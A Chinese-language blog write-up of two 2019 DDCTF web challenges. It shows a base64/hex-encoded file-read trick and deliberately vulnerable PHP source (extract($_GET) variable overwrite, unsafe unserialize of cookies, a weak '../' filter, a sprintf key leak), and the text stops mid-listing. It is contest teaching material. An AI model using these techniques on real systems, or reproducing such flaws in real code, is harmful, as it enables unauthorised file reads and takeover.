<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=manifest href=/manifest.json><meta name=description content="2019 DDCTF web writeup
"><title>2019 DDCTF Web wp</title><link rel=canonical href=https://blog.zeddyu.info/2019/05/06/2019ddctf/><link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="2019 DDCTF Web wp"><meta property="og:description" content="2019 DDCTF web writeup
"><meta property="og:url" content="https://blog.zeddyu.info/2019/05/06/2019ddctf/"><meta property="og:site_name" content="Zeddy's Blog"><meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="CTF"><meta property="article:tag" content="wp"><meta property="article:published_time" content="2019-05-06T08:50:43+00:00"><meta property="article:modified_time" content="2019-05-06T08:50:43+00:00"><meta name=twitter:site content="@ZeddYu_Lu"><meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="2019 DDCTF Web wp"><meta name=twitter:description content="2019 DDCTF web writeup
"><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDESKL57LT"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDESKL57LT",{anonymize_ip:!1})}</script></head><body class="article-page has-toc"><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex
extended"><div id=article-toolbar><a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg><span>Back</span></a></div><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>CTF</a></header><h2 class=article-title><a href=/2019/05/06/2019ddctf/>2019 DDCTF Web wp</a></h2><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published>May 06, 2019</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>14 minute read</time></div></footer></div></header><section class=article-content><p>2019 DDCTF web writeup</p><p>[TOC]</p><h2 id=web1-滴>Web1 滴～</h2><h3 id=description>Description</h3><p>{% colorquote info %}
NULL</p><p>题目地址：<a class=link href=http://117.51.150.246/ target=_blank rel=noopener>http://117.51.150.246</a></p><p>{% endcolorquote %}</p><h3 id=hacking>Hacking</h3><p>文件读取</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>index.php<span class=p>&lt;/</span><span class=nt>br</span><span class=p>&gt;</span>index.php<span class=p>&lt;/</span><span class=nt>br</span><span class=p>&gt;&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#39;data:image/gif;base64,PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=&#39;</span><span class=p>&gt;&lt;/</span><span class=nt>img</span><span class=p>&gt;</span>
</span></span></code></pre></div><p>直接读 index.php 得到</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607
</span></span></span><span class=line><span class=cl><span class=cm> * Date: July 4,2018
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl><span class=nx>error_reporting</span><span class=p>(</span><span class=k>E_ALL</span> <span class=o>||</span> <span class=o>~</span><span class=nx>E_NOTICE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>header</span><span class=p>(</span><span class=s1>&#39;content-type:text/html;charset=utf-8&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=o>!</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;jpg&#39;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nx>hex2bin</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;jpg&#39;</span><span class=p>])));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s1>&#39;&lt;title&gt;&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;jpg&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&lt;/title&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=s2>&#34;/[^a-zA-Z0-9.]+/&#34;</span><span class=p>,</span><span class=s2>&#34;&#34;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$file</span><span class=o>.</span><span class=s1>&#39;&lt;/br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$file</span> <span class=o>=</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;config&#34;</span><span class=p>,</span><span class=s2>&#34;!&#34;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$file</span><span class=o>.</span><span class=s1>&#39;&lt;/br&gt;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$txt</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$file</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;&lt;img src=&#39;data:image/gif;base64,&#34;</span><span class=o>.</span><span class=nv>$txt</span><span class=o>.</span><span class=s2>&#34;&#39;&gt;&lt;/img&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=cm>/*
</span></span></span><span class=line><span class=cl><span class=cm> * Can you find the flag file?
</span></span></span><span class=line><span class=cl><span class=cm> *
</span></span></span><span class=line><span class=cl><span class=cm> */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>找到类似的<a class=link href=http://roo0.me/2017/05/08/WP-for-i%E6%98%A5%E7%A7%8B-%E7%99%BE%E5%BA%A6%E6%9D%AFCTF%E6%AF%94%E8%B5%9B%EF%BC%88%E4%B9%9D%E6%9C%88%E7%AC%AC%E4%B8%80%E5%9C%BA%EF%BC%89/#base64%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB target=_blank rel=noopener>原题</a>，但是原题利用了<code>.idea</code>文件泄露，这里并没有，留下的只是一个深深的巨坑，首先看 php 顶部链接找到博客，然后发现这篇博客日期不对。找到该博主7月4日的博客，发现是一篇名为<a class=link href=https://blog.csdn.net/FengBanLiuYun/article/details/80913909 target=_blank rel=noopener>vim 异常退出 swp文件提示</a>的博客，看文章内容发现有一个恢复<code>.practice.txt.swp</code>的操作。</p><p>结果这里是个巨坑，最后是要拿到的文件是<code>practice.txt.swp</code>，并没有开头的<code>.</code>符号&mldr;然后提示<code>f1ag!ddctf.php</code>，然后去读这个文件源码，得到</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>include</span><span class=p>(</span><span class=s1>&#39;config.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$k</span> <span class=o>=</span> <span class=s1>&#39;hello&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>extract</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$uid</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$content</span><span class=o>=</span><span class=nx>trim</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$k</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nv>$uid</span><span class=o>==</span><span class=nv>$content</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=nv>$flag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>echo</span><span class=s1>&#39;hello&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>很简单的变量覆盖。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009556.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009556.jpg loading=lazy></a></figure></p><h2 id=web-2-web-签到题>Web 2 WEB 签到题</h2><h3 id=description-1>Description</h3><p>{% colorquote info %}
NULL</p><p>题目地址：<a class=link href=http://117.51.158.44/index.php target=_blank rel=noopener>http://117.51.158.44/index.php</a></p><p>{% endcolorquote %}</p><h3 id=hacking-1>Hacking</h3><p>url:app/Application.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>Class</span> <span class=nc>Application</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$path</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>response</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=nv>$errMsg</span> <span class=o>=</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;errMsg&#39;</span> <span class=o>=&gt;</span> <span class=nv>$errMsg</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;data&#39;</span> <span class=o>=&gt;</span> <span class=nv>$data</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=nv>$ret</span> <span class=o>=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$ret</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nx>header</span><span class=p>(</span><span class=s1>&#39;Content-type: application/json&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$ret</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>auth</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$DIDICTF_ADMIN</span> <span class=o>=</span> <span class=s1>&#39;admin&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_DIDICTF_USERNAME&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_DIDICTF_USERNAME&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=nv>$DIDICTF_ADMIN</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>response</span><span class=p>(</span><span class=s1>&#39;您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>TRUE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>response</span><span class=p>(</span><span class=s1>&#39;抱歉，您没有登陆权限，请获取权限后访问-----&#39;</span><span class=p>,</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>sanitizepath</span><span class=p>(</span><span class=nv>$path</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$path</span> <span class=o>=</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$path</span><span class=o>=</span><span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;../&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$path</span><span class=o>=</span><span class=nx>str_replace</span><span class=p>(</span><span class=s1>&#39;..\\&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$path</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>path</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$path</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>sanitizepath</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$path</span><span class=p>)</span> <span class=o>!==</span> <span class=mi>18</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>response</span><span class=p>(</span><span class=nv>$data</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$path</span><span class=p>),</span><span class=s1>&#39;Congratulations&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>url:app/Session.php</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>include</span> <span class=s1>&#39;Application.php&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Session</span> <span class=k>extends</span> <span class=nx>Application</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>//key建议为8位字符串
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>var</span> <span class=nv>$eancrykey</span>                  <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$cookie_expiration</span>			<span class=o>=</span> <span class=mi>7200</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$cookie_name</span>                <span class=o>=</span> <span class=s1>&#39;ddctf_id&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$cookie_path</span>				<span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$cookie_domain</span>				<span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$cookie_secure</span>				<span class=o>=</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>var</span> <span class=nv>$activity</span>                   <span class=o>=</span> <span class=s2>&#34;DiDiCTF&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>index</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=k>parent</span><span class=o>::</span><span class=na>auth</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>get_key</span><span class=p>();</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>session_read</span><span class=p>())</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$data</span> <span class=o>=</span> <span class=s1>&#39;DiDI Welcome you %s&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=nv>$data</span> <span class=o>=</span> <span class=nx>sprintf</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;HTTP_USER_AGENT&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>                <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=s1>&#39;sucess&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>session_create</span><span class=p>();</span>
</span></span><span class=line><span class=cl>                <span class=nv>$data</span> <span class=o>=</span> <span class=s1>&#39;DiDI Welcome you&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=s1>&#39;sucess&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>get_key</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>//eancrykey  and flag under the folder
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eancrykey</span> <span class=o>=</span>  <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;../config/key.txt&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>session_read</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$session</span> <span class=o>=</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cookie_name</span><span class=p>];</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$session</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=s2>&#34;session not found&#34;</span><span class=p>,</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$hash</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$session</span><span class=p>,</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$session</span><span class=p>)</span><span class=o>-</span><span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$session</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$session</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$session</span><span class=p>)</span><span class=o>-</span><span class=mi>32</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$hash</span> <span class=o>!==</span> <span class=nx>md5</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eancrykey</span><span class=o>.</span><span class=nv>$session</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=s2>&#34;the cookie data not match&#34;</span><span class=p>,</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nv>$session</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$session</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>is_array</span><span class=p>(</span><span class=nv>$session</span><span class=p>)</span> <span class=k>OR</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$session</span><span class=p>[</span><span class=s1>&#39;session_id&#39;</span><span class=p>])</span> <span class=k>OR</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$session</span><span class=p>[</span><span class=s1>&#39;ip_address&#39;</span><span class=p>])</span> <span class=k>OR</span> <span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$session</span><span class=p>[</span><span class=s1>&#39;user_agent&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=k>empty</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;nickname&#34;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s2>&#34;nickname&#34;</span><span class=p>],</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>eancrykey</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nv>$data</span> <span class=o>=</span> <span class=s2>&#34;Welcome my friend %s&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>foreach</span> <span class=p>(</span><span class=nv>$arr</span> <span class=k>as</span> <span class=nv>$k</span> <span class=o>=&gt;</span> <span class=nv>$v</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$data</span> <span class=o>=</span> <span class=nx>sprintf</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=nv>$v</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span><span class=s2>&#34;Welcome&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$session</span><span class=p>[</span><span class=s1>&#39;ip_address&#39;</span><span class=p>]</span> <span class=o>!=</span> <span class=nv>$_SERVER</span><span class=p>[</span><span class=s1>&#39;REMOTE_ADDR&#39;</span><span class=p>])</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>parent</span><span class=o>::</span><span class=na>response</span><span class=p>(</span><span class=s1>&#39;the ip addree not match&#39;</span><span class=o>.</span><span class=s1>&#39;error&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=k>FALSE</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
